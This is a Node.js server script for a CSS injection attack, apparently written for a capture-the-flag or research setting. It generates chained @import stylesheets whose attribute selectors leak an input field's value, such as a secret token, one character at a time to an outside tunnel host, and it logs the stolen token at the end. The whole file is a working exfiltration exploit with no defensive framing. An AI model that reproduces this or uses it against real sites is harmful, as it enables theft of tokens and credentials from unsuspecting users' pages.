const http = require('http');
const url = require('url');
const port = 3000;

const HOSTNAME = "https://ugly-panther-20.telebit.io";
const DEBUG = true;
const ALPHABET = [
    "0",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
    "A",
    "B",
    "C",
    "D",
    "E",
    "F",
    "G",
    "H",
    "I",
    "J",
    "K",
    "L",
    "M",
    "N",
    "O",
    "P",
    "Q",
    "R",
    "S",
    "T",
    "U",
    "V",
    "W",
    "X",
    "Y",
    "Z"
  ]

var prefix = "", postfix = "";
var pending = [];
var stop = false, ready = 0, n = 0;

const requestHandler = (request, response) => {
    let req = url.parse(request.url, url);
    log('\treq: %s', request.url);
    if (stop) return response.end();
    switch (req.pathname) {
        case "/start.css":
            genResponse(response);
            break;
        case "/start":
            console.log('start')
            genResponse(response);
            break;
        case "/leak":
            response.end();
            if (req.query.pre && prefix !== req.query.pre) {
                prefix = req.query.pre;
            } else if (req.query.post && postfix !== req.query.post) {
               postfix = req.query.post;
            } else {
                break;
            }
            if (ready == 2) {
                genResponse(pending.shift());
                ready = 0;
            } else {
                ready++;
                log('\tleak: waiting others...');
            }
            break;
        case "/next":
            if (ready == 2) {
                genResponse(response);
                ready = 0;
            } else {
                pending.push(response);
                ready++;
                log('\tquery: waiting others...');
            }
            break;
        case "/end":
            stop = true;
            console.log('[+] END: %s', req.query.token);
        default:
            response.end();
    }
}

const genResponse = (response) => {
    console.log('...pre-payoad: ' + prefix);
    console.log('...post-payoad: ' + postfix);
    let css = '@import url('+ HOSTNAME + '/next?' + Math.random() + ');' +
        ALPHABET.map(e => ('input[value$="' + e + postfix + '"]{--e'+n+':url(' + HOSTNAME + '/leak?post=' + e + postfix + ')}')).join('') +
        'div '.repeat(n) + 'input{background:var(--e'+n+')}' +
        ALPHABET.map(e => ('input[value^="' + prefix + e + '"]{--s'+n+':url(' + HOSTNAME + '/leak?pre=' + prefix + e +')}')).join('') +
        'div '.repeat(n) + 'input{border-image:var(--s'+n+')}' +
        'input[value='+ prefix + postfix + ']{list-style:url(' + HOSTNAME + '/end?token=' + prefix + postfix + '&)};';
    response.writeHead(200, { 'Content-Type': 'text/css'});
    response.write(css);
    response.end();
    n++;
}

const server = http.createServer(requestHandler)

server.listen(port, (err) => {
    if (err) {
        return console.log('[-] Error: something bad happened', err);
    }
    console.log('[+] Server is listening on %d', port);
})

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}